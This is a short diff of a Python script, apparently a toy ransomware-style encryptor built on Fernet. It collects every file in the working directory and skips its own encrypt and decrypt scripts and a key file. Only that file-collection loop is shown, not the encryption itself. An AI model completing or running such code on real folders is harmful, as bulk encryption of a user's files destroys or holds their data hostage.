@@ -11,7 +11,7 @@ from cryptography.fernet import Fernet
 
 files = []
 for file in os.listdir():
-    if file == "DANGER.py" or file == "sysfile.key" or file == "SAVEYOURSELF.py":
+    if file == "encrypt.py" or file == "sysfile.key" or file == "decrypt.py":
         continue
     if os.path.isfile(file):
         files.append(file)
